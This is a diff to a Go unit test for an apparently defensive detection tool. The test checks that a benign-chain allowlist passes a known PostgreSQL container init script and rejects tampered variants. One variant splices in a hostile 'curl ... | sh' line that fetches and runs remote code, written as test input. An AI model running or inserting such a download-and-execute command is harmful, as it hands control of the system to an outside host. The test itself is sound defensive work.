@@ -1,6 +1,7 @@
 package suppress
 
 import (
+	"strings"
 	"testing"
 	"time"
 
@@ -237,5 +238,50 @@ func TestBuiltinGroupedAncestorAndSafetyGate(t *testing.T) {
 	}
 	if !BuiltinAllowedRule("d2f3f4a1-9c30-4d3e-b1e7-3f6a1c2b4d5e", engine, false) {
 		t.Error("低/中危侦察规则应允许被内置良性链放行")
+	}
+}
+
+// Scutum 测试 PG 容器链：生产原文放行；脚本被改一个字、换了容器名或父进程都不放行。
+// 触发规则只有战术标签没有技术，detectcheck 语料测不到，在这里直接验
+func TestBuiltinScutumTestPGChain(t *testing.T) {
+	engine, _ := sigma.LoadDirReport("../../../rules")
+	chains, err := LoadBuiltinDir("../../../rules/benign-chains", engine)
+	if err != nil {
+		t.Fatal(err)
+	}
+	var conds []Condition
+	for _, c := range chains {
+		if c.ID == "scutum-test-pg-init" {
+			conds = c.Conditions
+		}
+	}
+	if conds == nil {
+		t.Fatal("缺 scutum-test-pg-init")
+	}
+	if !BuiltinAllowedRule("30bcce26-51c5-49f2-99c8-7b59e3af36c7", engine, false) {
+		t.Fatal("可疑目录执行脚本（中危执行类）应允许被内置链放行")
+	}
+	script := "bash -c export PATH=/usr/lib/postgresql/17/bin:$PATH PGDATA=/tmp/pgdata\necho test >/tmp/pw\ninitdb -U scutum -A scram-sha-256 --pwfile=/tmp/pw >/dev/null\necho 'host all all all scram-sha-256' >>$PGDATA/pg_hba.conf\nwhile :; do\n  while [ -f /tmp/hold ]; do sleep 0.2; done\n  postgres -c listen_addresses=* -c fsync=off\ndone"
+	event := func(container, cmd, parent string) map[string]any {
+		return map[string]any{
+			"container": map[string]any{"name": container, "runtime": "docker"},
+			"process": map[string]any{"file": map[string]any{"path": "/bin/bash"}, "cmd_line": cmd,
+				"parent_process": map[string]any{"file": map[string]any{"path": parent}, "cmd_line": "runc init"}},
+		}
+	}
+	cases := map[string]struct {
+		raw  map[string]any
+		want bool
+	}{
+		"生产原文":       {event("scutum-test-pg-4037943", script, "/runc"), true},
+		"其他主版本":      {event("scutum-test-pg-1", strings.Replace(script, "/17/", "/16/", 1), "/runc"), true},
+		"追加下载执行":     {event("scutum-test-pg-1", strings.Replace(script, "\nwhile :", "\ncurl -s http://203.0.113.9/x | sh\nwhile :", 1), "/runc"), false},
+		"别的容器名":      {event("evil-pg-1", script, "/runc"), false},
+		"父进程不是 runc": {event("scutum-test-pg-1", script, "/usr/sbin/sshd"), false},
+	}
+	for name, c := range cases {
+		if got := MatchesWithLineage(conds, c.raw, DefaultLineage(c.raw)); got != c.want {
+			t.Errorf("%s: 放行=%v，应为 %v", name, got, c.want)
+		}
 	}
 }
